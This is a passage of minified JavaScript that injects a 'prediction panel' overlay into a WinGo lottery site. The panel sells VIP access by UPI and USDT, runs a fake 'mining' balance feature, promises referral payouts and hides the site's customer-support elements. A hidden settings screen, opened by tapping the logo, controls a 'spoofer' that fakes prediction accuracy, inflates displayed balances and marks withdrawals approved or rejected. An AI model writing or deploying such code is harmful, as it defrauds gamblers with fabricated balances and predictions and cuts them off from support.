stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="2" y="6" width="20" height="12" rx="2" /> <path d="M22 10H2" /> <circle cx="17" cy="14" r="1.5" /> <\/svg>Available Balance<\/span> <span class="mine-val" id="mine-current-bal">₹5,000.00<\/span> <\/div> <div class="mine-row"> <span class="mine-lbl"><svg class="mine-lbl-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <circle cx="12" cy="12" r="10" /> <circle cx="12" cy="12" r="6" /> <circle cx="12" cy="12" r="2" /> <\/svg>Target Balance<\/span> <div class="mine-input-wrap"> <span class="mine-symbol">₹<\/span> <input type="number" id="mine-target-goal" class="mine-input" min="100" step="100" value="10000" placeholder="10000"> <\/div> <\/div> <div class="mine-row"> <span class="mine-lbl"><svg class="mine-lbl-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <path d="M12 22s-8-4.5-8-11.8A8 8 0 0 1 12 2a8 8 0 0 1 8 8.2c0 7.3-8 11.8-8 11.8z" /> <circle cx="12" cy="10" r="3" /> <\/svg>Stop Balance<\/span> <div class="mine-input-wrap"> <span class="mine-symbol">₹<\/span> <input type="number" id="mine-stop-loss" class="mine-input" min="0" step="100" value="" placeholder="No Limit"> <\/div> <\/div> <div class="mine-terminal-section"> <div class="mining-terminal" id="mine-console"> <div class="console-line active">System ready to mine...<\/div> <\/div> <\/div> <div class="mine-card-foot"> <button class="mine-cta" id="btn-mining-start">Start Mining · 1 Energy<\/button> <p class="mine-note">Stops Automatically at Target Balance<\/p> <\/div> <\/div> <\/div> <div class="mining-energy-modal" id="mining-energy-modal" style="display: none;"> <button class="energy-modal-close" id="btn-energy-close" aria-label="Close"> <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"> <path d="M18 6L6 18M6 6l12 12" /> <\/svg> <\/button> <div class="energy-modal-content"> <div class="energy-modal-icon"> <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg"> <rect x="6" y="18" width="44" height="28" rx="6" stroke="currentColor" stroke-width="3.5" /> <rect x="50" y="26" width="8" height="12" rx="3" fill="currentColor" opacity="0.3" /> <rect x="12" y="24" width="8" height="16" rx="2" fill="currentColor" opacity="0.2" /> <\/svg> <\/div> <div class="energy-modal-title">You\'re Out of Energy<\/div> <div class="energy-modal-desc">Each mining session uses one energy unit. Get a free boost below to start right away.<\/div> <div class="energy-modal-actions"> <button class="energy-btn-primary" id="btn-energy-boost">Get Free Energy<\/button> <button class="energy-btn-secondary" id="btn-energy-topup">Buy More Energy<\/button> <\/div> <\/div> <\/div> <div class="mining-history-modal" id="mining-history-modal" style="display: none;"> <button class="energy-modal-close" id="btn-history-close" aria-label="Close"> <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"> <path d="M18 6L6 18M6 6l12 12" /> <\/svg> <\/button> <div class="history-modal-content"> <div class="history-modal-title">Mining History<\/div> <div class="history-list" id="mining-history-list"><\/div> <button class="history-clear-btn" id="btn-history-clear">Clear History<\/button> <\/div> <\/div> <\/div> <\/div> <div class="gate-view"> <div class="gate-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"> <rect x="3" y="11" width="18" height="11" rx="2" ry="2"><\/rect> <path d="M7 11V7a5 5 0 0 1 10 0v4"><\/path> <\/svg><\/div> <h3 class="gate-title">Predictions Locked<\/h3> <div class="gate-bal-wrap"><span class="gate-balance" id="gate-bal">₹0.00<\/span><\/div> <p class="gate-desc">Minimum ₹500 balance required to<br>access real-time predictions.<\/p> <div class="gate-actions"> <button class="gate-btn btn-deposit">Deposit Now<\/button> <button class="gate-btn btn-telegram">Join Telegram<\/button> <\/div> <\/div><\/div><div class="bonus-view" id="bonus-view"> <div class="bonus-hdr"> <button class="bonus-back-btn" id="btn-bonus-back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="bonus-ttl">Referral Bonus<\/span> <\/div> <div class="bonus-scroll"> <div class="bonus-hero"> <div class="bonus-hero-icon">💰<\/div> <h2 class="bonus-h2">Invite &amp; Earn<\/h2> <p class="bonus-sub">Refer friends and earn commission on every deposit they make. No limits.<\/p> <\/div> <div class="bonus-stats-row"> <div class="bonus-stat"><span class="bonus-stat-val">₹1,000<\/span><span class="bonus-stat-lbl">Per referral<\/span> <\/div> <div class="bonus-stat"><span class="bonus-stat-val">∞<\/span><span class="bonus-stat-lbl">No cap<\/span><\/div> <div class="bonus-stat"><span class="bonus-stat-val">Instant<\/span><span class="bonus-stat-lbl">Payout<\/span> <\/div> <\/div> <div class="bonus-prog-card"> <div class="bonus-prog-lbl"><span>Your progress<\/span><span class="bonus-prog-count">0 / 10 Qualified<\/span><\/div> <div class="bonus-bar"> <div class="bonus-bar-fill"><\/div> <\/div> <\/div> <div class="bonus-tiers"> <div class="bonus-section-ttl">Reward Tiers<\/div> <div class="bonus-tier"><span class="tier-badge t-bronze">5<\/span><span class="tier-info">5 referrals → <b>₹5,000<\/b> + Bronze badge<\/span><\/div> <div class="bonus-tier"><span class="tier-badge t-silver">10<\/span><span class="tier-info">10 referrals → <b>₹10,000<\/b> + Silver badge<\/span><\/div> <div class="bonus-tier"><span class="tier-badge t-gold">25<\/span><span class="tier-info">25 referrals → <b>₹30,000<\/b> + Gold badge<\/span><\/div> <div class="bonus-tier"><span class="tier-badge t-diamond">50<\/span><span class="tier-info">50 referrals → <b>₹75,000<\/b> + VIP access<\/span><\/div> <\/div> <button class="bonus-cta-btn" id="btn-copy-invite">Copy Invite Link<\/button> <div class="bonus-link-preview" id="bonus-link-preview"><\/div> <div class="bonus-rules"> <div class="bonus-section-ttl">How it works<\/div> <div class="bonus-rule">1. Share your unique invite link with friends<\/div> <div class="bonus-rule">2. Friend registers using your link<\/div> <div class="bonus-rule">3. Friend makes their first deposit (min ₹500)<\/div> <div class="bonus-rule">4. Bonus credited instantly to your wallet<\/div> <\/div> <div class="bonus-rules"> <div class="bonus-section-ttl">Terms<\/div> <div class="bonus-rule">• Referral must make a minimum first deposit of ₹500<\/div> <div class="bonus-rule">• Self-referral is not permitted<\/div> <div class="bonus-rule">• Bonus is credited as withdrawable balance<\/div> <div class="bonus-rule">• Management reserves the right to modify terms<\/div> <\/div> <\/div><\/div><div class="wg-overlay inactive" id="wg-promo-overlay"><\/div><div class="wg-popup inactive" id="wg-promo-banner"> <div class="wg-close-x" id="wg-promo-close">✕<\/div> <div class="wg-pop-hero"> <div class="wg-pop-icon">💰<\/div> <div class="wg-pop-amount">FREE ₹1,000<\/div> <div class="wg-pop-pill">Per Referral &bull; No Limit &bull; Instant Payout<\/div> <\/div> <div class="wg-pop-stats"> <div class="wg-stat-chip">💸 Instant<\/div> <div class="wg-stat-chip">♾️ No Cap<\/div> <div class="wg-stat-chip">✅ Verified<\/div> <\/div> <div class="wg-pop-body">Invite friends to join. Every time they deposit, you earn ₹1,000 commission — instantly credited, zero waiting.<\/div> <button class="wg-pop-cta" id="wg-promo-cta">🎁 Claim Free Bonus →<\/button> <div class="wg-pop-footer"> <div class="wg-checkbox" id="wg-promo-check" role="checkbox" aria-checked="false"> <div class="wg-checkbox__icon"><span class="wg-check-tick">✓<\/span><\/div> <\/div> <span class="wg-no-remind" id="wg-promo-remind">No More Reminders Today<\/span> <\/div><\/div>'),
                    (this._logo = n.querySelector(".logo")),
                    (this._panel = n.querySelector(".panel")),
                    (this._header = n.querySelector(".panel-header")),
                    (this._closeBtn = n.querySelector(".close-btn")),
                    (this._gateView = n.querySelector(".gate-view")),
                    (this._body = n.querySelector(".panel-body")),
                    (this._gateBal = n.querySelector("#gate-bal")),
                    Zn(this, Xn("logo")),
                    (n.querySelector("#brand-name").textContent = Ao),
                    (n.querySelector("#brand-domain").textContent = so),
                    re(this, this._logo, {
                        onTap: () => this._showPanel(),
                    }),
                    we(this, this._header, this._panel),
                    this._closeBtn.addEventListener("pointerdown", (q) =>
                        q.stopPropagation(),
                    ),
                    this._closeBtn.addEventListener("click", () => this._showLogo()),
                    n
                        .querySelector(".btn-deposit")
                        .addEventListener("click", () => (location.href = Do)),
                    n
                        .querySelector(".btn-telegram")
                        .addEventListener("click", () =>
                            window.open("https://telegram.dog/predictwingoo", "_blank"),
                        ),
                    n.querySelector("#btn-pro").addEventListener("click", () => {
                        (this._setView("pro"), ie(-1), tn("loading"), se());
                    }),
                    n
                        .querySelector("#btn-status-tg")
                        .addEventListener("click", () => this._setView("tg")),
                    n
                        .querySelector("#btn-vip")
                        .addEventListener("click", () => this._setView("vip")),
                    n
                        .querySelector("#btn-mine")
                        .addEventListener("click", () => this._setView("mining")),
                    n
                        .querySelector("#btn-tg-back")
                        .addEventListener("click", () => this._setView("menu")),
                    n
                        .querySelector("#btn-vip-back")
                        .addEventListener("click", () => this._setView("menu")),
                    n
                        .querySelector("#btn-pro-back")
                        .addEventListener("click", () => this._setView("menu")),
                    n
                        .querySelector("#btn-vip-pay-back")
                        .addEventListener("click", () => this._setView("vip")),
                    n
                        .querySelector("#btn-tg-join")
                        .addEventListener("click", () =>
                            window.open("https://telegram.dog/predictwingoo", "_blank"),
                        ),
                    n
                        .querySelector("#btn-vip-checkout")
                        .addEventListener("click", () => this._setView("vip-pay")),
                    n
                        .querySelector("#btn-pay-upi")
                        .addEventListener("click", () => this._startVipCheckout("upi")),
                    n
                        .querySelector("#btn-pay-crypto")
                        .addEventListener("click", () => this._startVipCheckout("crypto")),
                    n
                        .querySelector("#btn-vip-checkout-back")
                        .addEventListener("click", () => {
                            if ((this._setView("vip-pay"), vn)) clearInterval(vn);
                        }),
                    n.querySelector("#btn-vip-confirm").addEventListener("click", () => {
                        (this._setView("vip-submit"),
                            (n.querySelector("#vip-utr-input").value = ""),
                            (n.querySelector("#vip-file-input").value = ""),
                            (n.querySelector("#vip-file-preview").style.display = "none"),
                            (n.querySelector("#vip-file-placeholder").style.display = "flex"),
                            (n.querySelector("#btn-vip-file-remove").style.display = "none"));
                    }),
                    n
                        .querySelector("#btn-vip-submit-back")
                        .addEventListener("click", () => {
                            this._setView("vip-checkout");
                        }),
                    n.querySelector("#btn-vip-history").addEventListener("click", () => {
                        (this._renderVipHistory(),
                            this._setView("vip-history"),
                            this._syncVipHistory());
                    }),
                    n
                        .querySelector("#btn-vip-history-back")
                        .addEventListener("click", () => {
                            this._setView("vip-pay");
                        }),
                    n.querySelector("#vip-file-zone").addEventListener("click", () => {
                        n.querySelector("#vip-file-input").click();
                    }),
                    n.querySelector("#vip-file-input").addEventListener("change", (q) => {
                        let h = q.target.files[0];
                        if (h) {
                            let $ = new FileReader();
                            (($.onload = (L) => {
                                ((n.querySelector("#vip-file-preview").src = L.target.result),
                                    (n.querySelector("#vip-file-preview").style.display =
                                        "block"),
                                    (n.querySelector("#vip-file-placeholder").style.display =
                                        "none"),
                                    (n.querySelector("#btn-vip-file-remove").style.display =
                                        "flex"));
                            }),
                                $.readAsDataURL(h));
                        }
                    }),
                    n
                        .querySelector("#btn-vip-file-remove")
                        .addEventListener("click", (q) => {
                            (q.preventDefault(),
                                q.stopPropagation(),
                                (n.querySelector("#vip-file-input").value = ""));
                            let h = n.querySelector("#vip-file-preview");
                            ((h.src = ""),
                                (h.style.display = "none"),
                                (n.querySelector("#vip-file-placeholder").style.display =
                                    "flex"),
                                (n.querySelector("#btn-vip-file-remove").style.display =
                                    "none"));
                        }),
                    n
                        .querySelector("#btn-vip-submit-proof")
                        .addEventListener("click", () => {
                            let q = n.querySelector("#vip-utr-input"),
                                h = n.querySelector("#vip-file-input"),
                                $ = q.value.trim();
                            if (!$) {
                                alert("Please enter your UTR / Transaction Hash");
                                return;
                            }
                            let L = n.querySelector("#btn-vip-submit-proof");
                            ((L.textContent = "Uploading..."), (L.disabled = !0));
                            let m = new FormData();
                            (m.append("utr", $),
                                m.append("type", this._checkoutType || "upi"),
                                m.append(
                                    "amount",
                                    this._checkoutType === "crypto"
                                        ? D.cryptoAmountUsd.toFixed(2) + " USDT"
                                        : "₹" + D.amount,
                                ));
                            let y = "Unknown";
                            try {
                                y =
                                    sessionStorage.getItem("wg_user") ||
                                    localStorage.getItem("wg_user") ||
                                    "Unknown";
                            } catch (a) { }
                            if ((m.append("user", y), h.files[0]))
                                m.append("screenshot", h.files[0]);
                            fetch("/ar-api/vip-submit", {
                                method: "POST",
                                body: m,
                            })
                                .then((a) => a.json())
                                .then((a) => {
                                    if (a.ok) {
                                        let u = [];
                                        try {
                                            u = JSON.parse(
                                                localStorage.getItem("wg_vip_orders") || "[]",
                                            );
                                        } catch (v) { }
                                        (u.unshift({
                                            type: this._checkoutType || "upi",
                                            utr: $,
                                            date: Date.now(),
                                            status: "Pending",
                                        }),
                                            localStorage.setItem("wg_vip_orders", JSON.stringify(u)),
                                            (L.textContent = "Submitted ✓"),
                                            (L.style.cssText =
                                                "background: #10b981; color: #fff; border-color: #10b981;"),
                                            setTimeout(() => {
                                                ((L.textContent = "Submit Proof"),
                                                    (L.style.cssText = ""),
                                                    (L.disabled = !1),
                                                    this._renderVipHistory(),
                                                    this._setView("vip-history"));
                                            }, 1500));
                                    } else
                                        (alert(
                                            a.error || "Failed to submit proof. Please try again.",
                                        ),
                                            (L.textContent = "Submit Proof"),
                                            (L.disabled = !1));
                                })
                                .catch((a) => {
                                    (console.error(a),
                                        alert("Connection error. Please try again."),
                                        (L.textContent = "Submit Proof"),
                                        (L.disabled = !1));
                                });
                        }),
                    n.querySelector("#btn-vip-copy").addEventListener("click", () => {
                        let q = n.querySelector("#vip-address-val").textContent;
                        (($) => {
                            let L = document.createElement("textarea");
                            ((L.value = $),
                                (L.style.position = "fixed"),
                                (L.style.opacity = "0"),
                                (L.style.left = "-9999px"),
                                n.appendChild(L),
                                L.focus(),
                                L.select(),
                                L.setSelectionRange(0, 99999));
                            let m = !1;
                            try {
                                m = document.execCommand("copy");
                            } catch (y) { }
                            if ((n.removeChild(L), m)) return Promise.resolve();
                            if (navigator.clipboard) return navigator.clipboard.writeText($);
                            return Promise.reject();
                        })(q)
                            .then(() => {
                                let $ = n.querySelector("#btn-vip-copy"),
                                    L = $.textContent;
                                (($.textContent = "Copied!"),
                                    $.classList.add("copied"),
                                    setTimeout(() => {
                                        (($.textContent = L), $.classList.remove("copied"));
                                    }, 2000));
                            })
                            .catch(($) => {
                                console.error("Copy failed:", $);
                            });
                    }),
                    n.querySelector("#vip-upi-hint").addEventListener("click", () => {
                        Yn = (Yn + 1) % D.upi.length;
                        let q = D.upi[Yn];
                        n.querySelector("#vip-address-val").textContent = q;
                        let h = encodeURIComponent(q),
                            $ = encodeURIComponent("VIP"),
                            L = encodeURIComponent(D.amount),
                            m = `upi://pay?pa=${h}&pn=${$}&am=${L}&cu=INR`,
                            y = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(m)}`;
                        n.querySelector("#vip-qr-img").src = y;
                    }),
                    n
                        .querySelector("#btn-settings-back")
                        .addEventListener("click", () => this._setView("menu")),
                    n.querySelector("#btn-spoof-reset").addEventListener("click", () => {
                        (window.__wgSpoofer.saveSetting("accuracy", 70),
                            window.__wgSpoofer.saveSetting("balanceOffset", 5000),
                            window.__wgSpoofer.resetBalance(),
                            this._syncSettings());
                    }));
                let t = [],
                    e = n.querySelector(".panel-title img");
                e.style.pointerEvents = "auto";
                let o = () => {
                    if (!window.__wgSpoofer || !window.__wgSpoofer.isVip()) return;
                    if ((t.push(Date.now()), t.length >= 5)) {
                        if (t[t.length - 1] - t[t.length - 5] < 2000)
                            ((t.length = 0), this._setView("settings"), this._syncSettings());
                        if (t.length > 10) t.splice(0, t.length - 5);
                    }
                };
                (e.addEventListener(
                    "pointerdown",
                    (q) => {
                        (q.stopImmediatePropagation(), q.stopPropagation());
                    },
                    !0,
                ),
                    e.addEventListener("pointerup", o, !0),
                    e.addEventListener("click", o));
                let i = n.querySelector("#spoof-acc-range"),
                    l = n.querySelector("#spoof-acc-num"),
                    f = n.querySelector("#spoof-bal");
                (i.addEventListener("input", () => {
                    ((l.value = i.value),
                        window.__wgSpoofer.saveSetting("accuracy", parseInt(i.value)));
                }),
                    l.addEventListener("input", () => {
                        ((i.value = l.value),
                            window.__wgSpoofer.saveSetting("accuracy", parseInt(l.value)));
                    }),
                    f.addEventListener("input", () => {
                        (window.__wgSpoofer.saveSetting(
                            "balanceOffset",
                            parseInt(f.value) || 0,
                        ),
                            window.__wgSpoofer.resetBalance());
                    }));
                let c = n.querySelector("#spoof-withdrawals-list");
                if (c)
                    c.addEventListener("click", (q) => {
                        let h = q.target.closest("button[data-id]");
                        if (!h) return;
                        let $ = h.getAttribute("data-id"),
                            L = h.classList.contains("btn-approve") ? 1 : 0;
                        if (window.__wgSpoofer)
                            window.__wgSpoofer.updateWithdrawalStatus($, L);
                        this._renderWithdrawals();
                    });
                let p = Nn();
                if (p) {
                    let q = n.querySelector("#pro-mode");
                    if (q) q.textContent = ct(p);
                    if (!it().length) en();
                }
                let w = document.createElement("style");
                ((w.textContent = ".customer,.changlongEnter{display:none!important}"),
                    document.head.appendChild(w),
                    Ee(n),
                    ge(n),
                    yn(n),
                    Le(500),
                    $e());
                let S = () => {
                    let q = document.querySelector("#app");
                    if (!q) return;
                    let h = q.getBoundingClientRect();
                    (this.style.setProperty("--bv-left", h.left + "px"),
                        this.style.setProperty("--bv-width", h.width + "px"));
                };
                (S(), new ResizeObserver(S).observe(document.documentElement));
                let M = (q) => {
                    if (typeof q?.detail?.balance === "number")
                        window.__wg_balance = q.detail.balance;
                    this._checkBalance();
                };
                (window.addEventListener("wg-qualified", M),
                    window.addEventListener("wg-balance", M),
                    this._checkBalance());
            }
            _checkBalance() {
                if (sessionStorage.getItem("wg_qualified")) {
                    ((this._body.style.display = "block"),
                        (this._gateView.style.display = "none"));
                    return;
                }
                let n = window.__wg_balance || 0;
                if (window.__wgSpoofer && window.__wgSpoofer.isVip())
                    try {
                        let t = JSON.parse(localStorage.getItem("wg_spoof_state"));
                        if (t && t.balance !== null) n = t.balance;
                    } catch (t) { }
                if (((this._gateBal.textContent = "₹" + Number(n).toFixed(2)), n < 500))
                    ((this._body.style.display = "none"),
                        (this._gateView.style.display = "block"));
                else
                    ((this._body.style.display = "block"),
                        (this._gateView.style.display = "none"));
            }
            _showPanel() {
                ((this._mode = "panel"),
                    (this._logo.style.display = "none"),
                    this._panel.classList.add("active"),
                    this._checkBalance());
                let n = Xn("panel");
                if (n) Zn(this, n);
                else ve(this, this._panel);
            }
            _showLogo() {
                ((this._mode = "logo"),
                    this._panel.classList.remove("active"),
                    (this._logo.style.display = "block"),
                    Zn(this, Xn("logo")));
            }
            _setView(n) {
                this.shadowRoot
                    .querySelectorAll(".view")
                    .forEach((e) => e.classList.remove("active"));
                let t = this.shadowRoot.querySelector(".view-" + n);
                if (t) t.classList.add("active");
            }
            _startVipCheckout(n) {
                this._checkoutType = n;
                let t = this.shadowRoot,
                    e = t.querySelector("#vip-loader");
                ((e.style.display = "flex"),
                    setTimeout(() => {
                        e.style.display = "none";
                        let i =
                            "VIP-" +
                            Math.floor(Math.random() * 16777215)
                                .toString(16)
                                .toUpperCase()
                                .padStart(6, "0");
                        if (((t.querySelector("#vip-order-id").textContent = i), vn))
                            clearInterval(vn);
                        let l = "",
                            f = "",
                            c = "";
                        if (n === "upi") {
                            Yn = 0;
                            let S = D.upi;
                            ((l = S[0]),
                                (f = "₹" + D.amount),
                                (t.querySelector("#vip-checkout-title").textContent =
                                    "UPI Payment"),
                                (t.querySelector("#vip-address-lbl").textContent = "UPI ID"),
                                (t.querySelector("#vip-network-lbl").style.display = "none"));
                            let M = encodeURIComponent(l),
                                q = encodeURIComponent("VIP"),
                                h = encodeURIComponent(D.amount),
                                $ = `upi://pay?pa=${M}&pn=${q}&am=${h}&cu=INR`;
                            if (
                                ((c = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent($)}`),
                                    S.length > 1)
                            )
                                t.querySelector("#vip-upi-hint").style.display = "flex";
                            else t.querySelector("#vip-upi-hint").style.display = "none";
                        } else
                            ((l = D.crypto.trc20),
                                (f = `$${D.cryptoAmountUsd.toFixed(2)} USDT`),
                                (t.querySelector("#vip-checkout-title").textContent =
                                    "Crypto USDT"),
                                (t.querySelector("#vip-address-lbl").textContent =
                                    "USDT Address"),
                                (t.querySelector("#vip-network-lbl").style.display =
                                    "inline-block"),
                                (t.querySelector("#vip-upi-hint").style.display = "none"),
                                (c = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(l)}`));
                        ((t.querySelector("#vip-address-val").textContent = l),
                            (t.querySelector("#vip-checkout-amount").textContent = f),
                            (t.querySelector("#vip-qr-img").src = c));
                        let p = () => {
                            let S = Date.now(),
                                q =
                                    parseInt(localStorage.getItem("vip_timer_end") || "0") - S;
                            if (q <= 0) {
                                ((t.querySelector("#vip-checkout-timer").textContent =
                                    "00:00:00"),
                                    clearInterval(vn));
                                return;
                            }
                            let h = Math.floor(q / 3600000)
                                .toString()
                                .padStart(2, "0"),
                                $ = Math.floor((q % 3600000) / 60000)
                                    .toString()
                                    .padStart(2, "0"),
                                L = Math.floor((q % 60000) / 1000)
                                    .toString()
                                    .padStart(2, "0");
                            t.querySelector("#vip-checkout-timer").textContent =
                                `${h}:${$}:${L}`;
                        },
                            w = parseInt(localStorage.getItem("vip_timer_end") || "0");
                        if (!w || w <= Date.now())
                            ((w = Date.now() + 86400000),
                                localStorage.setItem("vip_timer_end", w.toString()));
                        (p(), (vn = setInterval(p, 1000)), this._setView("vip-checkout"));
                    }, 2500));
            }
            _renderVipHistory() {
                let t = this.shadowRoot.querySelector("#vip-history-list");
                if (!t) return;
                let e = [];
                try {
                    e = JSON.parse(localStorage.getItem("wg_vip_orders") || "[]");
                } catch (o) { }
                if (e.length === 0) {
                    t.innerHTML = `
          <div class="vip-history-empty">
            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
              <circle cx="12" cy="12" r="10" />
              <polyline points="12 6 12 12 16 14" />
            </svg>
            <span class="vip-history-empty-title">No Orders Yet</span>
            <span class="vip-history-empty-sub">Completed payments will appear here</span>
          </div>`;
                    return;
                }
                t.innerHTML = e
                    .map((o) => {
                        let i = new Date(o.date).toLocaleString(),
                            l = String(o.type).toLowerCase() === "crypto",
                            f = l ? "vip-history-crypto" : "vip-history-upi",
                            c = l ? "Crypto" : "UPI",
                            p = String(o.status || "Pending"),
                            w =
                                p === "Approved"
                                    ? "status-approved"
                                    : p === "Rejected"
                                        ? "status-rejected"
                                        : "status-pending",
                            S =
                                p === "Rejected" && o.remark
                                    ? `<div class="vip-history-remark">${o.remark}</div>`
                                    : "";
                        return `
          <div class="vip-history-row ${f}">
            <div class="vip-history-row-top">
              <span class="vip-history-type">${c}</span>
              <span class="vip-history-status ${w}">${p}</span>
            </div>
            <span class="vip-history-ref">Ref · ${o.utr}</span>
            <span class="vip-history-date">${i}</span>
            ${S}
          </div>`;
                    })
                    .join("");
            }
            async _syncVipHistory() {
                let n = [];
                try {
                    n = JSON.parse(localStorage.getItem("wg_vip_orders") || "[]");
                } catch (e) { }
                if (!n.length) return;
                let t = n.map((e) => e.utr).filter(Boolean);
                if (!t.length) return;
                try {
                    let e = await fetch("/ar-api/vip-sync", {
                        method: "POST",
                        headers: {
                            "content-type": "application/json",
                        },
                        body: JSON.stringify({
                            utrs: t,
                        }),
                    });
                    if (!e.ok) return;
                    let o = await e.json();
                    if (!o.ok || !o.orders) return;
                    let i = !1;
                    for (let l of n) {
                        let f = o.orders[l.utr];
                        if (!f) continue;
                        if (l.status !== f.status || (l.remark || "") !== (f.remark || ""))
                            ((l.status = f.status), (l.remark = f.remark || ""), (i = !0));
                    }
                    if (i)
                        (localStorage.setItem("wg_vip_orders", JSON.stringify(n)),
                            this._renderVipHistory());
                } catch (e) { }
            }
            _syncSettings() {
                if (!window.__wgSpoofer) return;
                let n = window.__wgSpoofer.getSettings(),
                    t = this.shadowRoot;
                ((t.querySelector("#spoof-acc-range").value = n.accuracy),
                    (t.querySelector("#spoof-acc-num").value = n.accuracy),
                    (t.querySelector("#spoof-bal").value = n.balanceOffset),
                    this._renderWithdrawals());
            }
            _renderWithdrawals() {
                if (!window.__wgSpoofer) return;
                let n = window.__wgSpoofer.getWithdrawals(),
                    t = this.shadowRoot.querySelector("#spoof-withdrawals-list");
                if (!t) return;
                t.innerHTML = "";
                let e = [];
                for (let i in n) e.push(n[i]);
                e.sort((i, l) => l.addTime - i.addTime);
                let o = document.createDocumentFragment();
                (e.forEach((i) => {
                    let l = document.createElement("div");
                    l.className = "w-item";
                    let f = "Processing",
                        c = "status-processing";
                    if (i.state === 1 || i.state === 2)
                        ((f = "Success"), (c = "status-success"));
                    else if (i.state === 0 || i.state === 4)
                        ((f = "Failed"), (c = "status-failed"));
                    ((l.innerHTML = `<div class="w-info"><div class="w-id">${i.withdrawNumber}</div><div class="w-amt">₹${i.amount}</div><div class="w-time">${new Date(i.addTime).toLocaleString()}</div><div class="w-state ${c}">${f}</div></div><div class="w-actions"><button class="btn-approve" data-id="${i.withdrawNumber}">Approve</button><button class="btn-reject" data-id="${i.withdrawNumber}">Reject</button></div>`),
                        o.appendChild(l));
                }),
                    t.appendChild(o));
            }
        },
    );
function Vn() {
    let n = location.hash.includes("/saasLottery/WinGo"),
        t = document.querySelector("prediction-panel");
    if (!t)
        ((t = document.createElement("prediction-panel")),
            document.body.appendChild(t));
    t.dataset.route = n ? "game" : "other";
    let e = document.querySelector(
        ".timer-card.active .card-title, .TimeLeft__C-name",
    ),
        o = String(e?.textContent || "")
            .toLowerCase()
            .replace(/\s+/g, ""),
        i = "";
    if (o.includes("wingo30")) i = "WinGo_30S";
    else if (o.includes("wingo1min") || o.includes("wingo1m")) i = "WinGo_1M";
    else if (o.includes("wingo3min") || o.includes("wingo3m")) i = "WinGo_3M";
    else if (o.includes("wingo5min") || o.includes("wingo5m")) i = "WinGo_5M";
    if (!i) {
        let l = location.hash.match(/gameCode=(WinGo_\w+)/);
        i = l ? l[1] : "";
    }
    if (i && i !== Nn()) lt(i);
}
["pushState", "replaceState"].forEach((n) => {
    let t = history[n];
    history[n] = function (...e) {
        (t.apply(this, e), Vn());
    };
});
window.addEventListener("hashchange", Vn);
setInterval(Vn, 500);
setTimeout(Vn, 100);
